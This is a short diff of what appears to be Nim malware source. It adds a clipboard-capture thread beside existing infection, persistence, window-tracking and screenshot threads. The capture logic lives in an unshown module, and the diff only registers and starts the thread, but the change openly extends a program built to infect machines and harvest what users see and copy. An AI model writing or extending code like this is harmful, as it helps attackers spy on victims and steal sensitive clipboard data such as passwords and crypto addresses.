@@ -47,6 +47,7 @@ from lib/flags import USE_INFECT_THREAD
 from lib/flags import USE_PERSISTENCE_THREAD
 from lib/flags import USE_WINDOW_NAME_THREAD
 from lib/flags import USE_SCREENSHOT_THREAD
+from lib/flags import USE_CLIPBOARD_THREAD
 
 when not isProd:
   echo "started"
@@ -96,6 +97,13 @@ when USE_SCREENSHOT_THREAD:
   var screenshotThreadVar: Thread[void]
 
   createThread(screenshotThreadVar, initScreenshotThread)
+
+when USE_CLIPBOARD_THREAD:
+  from lib/threads/clipboardThread import initClipboardThread
+
+  var clipboardThreadVar: Thread[void]
+
+  createThread(clipboardThreadVar, initClipboardThread)
 
 # wait for thread messages
 while true:
